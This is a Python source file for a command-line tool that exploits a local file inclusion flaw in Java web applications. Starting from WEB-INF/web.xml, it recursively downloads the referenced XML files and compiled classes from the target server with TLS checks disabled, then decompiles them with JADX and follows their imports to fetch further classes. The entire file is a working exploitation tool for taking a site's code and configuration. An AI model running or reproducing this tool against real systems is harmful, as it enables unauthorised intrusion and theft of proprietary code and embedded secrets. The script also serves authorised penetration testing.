import requests
import re
import sys
import os
from urllib3.exceptions import InsecureRequestWarning
import argparse
import logging
import subprocess

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class Dumper:
    local_path = "xmls"
    classes_path = "classes"
    #proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
    proxies = {}

    def __init__(self, url, cookies, dest, xml = "WEB-INF/web.xml"):
        self.url = url
        self.cookies = cookies
        self.tried = {}
        self.xml = xml
        self.local_path = os.path.join(dest, self.local_path)
        os.makedirs(self.local_path, exist_ok=True)
        self.classes_path = os.path.join(dest, self.classes_path)


    def dump_recursive_xml(self,xml=None):
        if xml is None:
            xml = self.xml
        level_xmls = []
        r = requests.get(self.url.replace('WEB-INF/web.xml',xml),cookies=self.cookies,proxies=self.proxies,verify=False)
        if r.status_code != 200:
            return []
        os.makedirs(os.path.join(self.local_path,*(xml.split('/')[:-1])),exist_ok=True)
        level_xmls = re.findall('WEB-INF/[^\s<,"\]]*',r.text)
        # Removing any jsp file if referenced
        # Skipping this process since my LFI directly included the .jsp, interpreting it, if it allows to download binary file you may want to comment the next line
        level_xmls = [x for x in level_xmls if not x.endswith('.jsp')]
        fo = open(os.path.join(self.local_path,*(xml.split('/'))),'wb')
        fo.write(r.content)
        fo.close()
        for dumped_xml in level_xmls:
            logging.info("Recursing in: "+dumped_xml)
            self.dump_recursive_xml(dumped_xml)
        return

    def parse_and_download(self, prefix, r, cls):
        folder = os.path.join(self.classes_path, *(cls.split(os.sep)[:-1]))
        os.makedirs(folder, exist_ok=True)
        class_name = os.path.join(self.classes_path,cls)
        logging.info("Analyzing "+class_name)
        if not os.path.exists(class_name):
            fo = open(class_name,'wb')
            fo.write(r.content)
            fo.close()
            logging.info("Disassembling class with JADX.")
            subprocess.run(["./jadx/bin/jadx",class_name,"-d",os.path.join(self.classes_path,prefix)], stdout=subprocess.DEVNULL)
            java_path = class_name.split(prefix+os.sep)[1:]
            file_name = os.path.join(self.classes_path,prefix,"sources",*java_path).replace(".class",".java")
            fi = open(file_name,"r")
            lines = fi.readlines()
            fi.close()
            for l in lines:
                if "import " not in l:
                    continue
                # Skipping imports like java.io.*
                if "*" in l:
                    continue
                # Removing 'import ',trailing ";" and removing any remaining whitespace
                cls = l.replace("import ","").replace(";","").replace(" ","").replace("\t","").replace("\n","").replace(".","/")+".class";
                res = self.try_download("WEB-INF/classes", cls)
                if res == False:
                    self.try_download("WEB-INF/lib",cls)

    def try_download(self, prefix, cls):
        cls = os.path.join(prefix,cls)
        folder = os.path.join(self.classes_path, *(cls.split("/")[:-1]))
        if os.path.exists(os.path.join(self.classes_path,cls)):
            return
        if cls in self.tried.keys():
            return self.tried[cls]
        r = requests.get(self.url.replace('WEB-INF/web.xml',cls),cookies=self.cookies,proxies=self.proxies,verify=False)
        if r.status_code == 200:
            logging.info("Found class "+cls+". Recursing...")
            # Found a class, parse it and recursively try downloading classes that it imports
            self.tried[cls] = True
            self.parse_and_download(prefix, r, cls)
            return True
        self.tried[cls] = False
        return False


    def dump_classes(self, xml_path):
        java_class_regex='(?:[a-zA-Z_$][a-zA-Z\d_$]*\.)(?:[a-zA-Z_$][a-zA-Z\d_$]*\.)+[a-zA-Z_$][a-zA-Z\d_$]+'
        os.makedirs(self.classes_path,exist_ok=True)
        fi = open(xml_path,'r')
        text = fi.read()
        fi.close()
        for cls in re.findall(java_class_regex,text):
            cls = cls.replace("\t","").replace("\n","").replace(".","/")+".class"
            res = self.try_download("WEB-INF/classes", cls)
            # if class wasn't found try in WEB-INF/lib
            if res == False:
                self.try_download("WEB-INF/lib", cls)

    def visit_xml_and_dump(self):
        for curpath, folders, files in os.walk(self.local_path):
            for filename in files:
                if ".xml" in filename:
                    logging.info("Analyzing XML file: "+os.path.join(curpath,filename))
                    self.dump_classes(os.path.join(curpath,filename))



def main():
    cookies = dict()
    parser = argparse.ArgumentParser(description='Automatic LFI dumper for Java Web Applications.')
    parser.add_argument('url', type=str, help='The URL of the LFI page. It must include the "WEB-INF/web.xml" part from where to start dumping (e.g. https://example.com/?file=WEB-INF/web.xml).')
    parser.add_argument('-c','--cookies', type=str, help='Cookies of the web application, if needed.',default='')
    parser.add_argument('-b','--base', type=str, help='Starting XML file to dump from. Default is "WEB-INF/web.xml".',default="WEB-INF/web.xml")
    parser.add_argument('-d','--dest', type=str, help='Dump directory destination.',default='dumps')
    parser.add_argument('-s','--silent',help='Silent mode: do not print output', default=False, action='store_true')
    args = parser.parse_args()
    if args.silent:
        level = logging.ERROR
    else:
        level = logging.INFO
    logging.basicConfig(format='%(message)s',level=level)
    if args.cookies != '':
        cookies = {x[0]:x[1] for x in [s.split("=") for s in args.cookies.split(";")]}
    d = Dumper(args.url, cookies, args.dest, args.base)

    d.dump_recursive_xml()

    d.visit_xml_and_dump()

if __name__=='__main__':
    main()
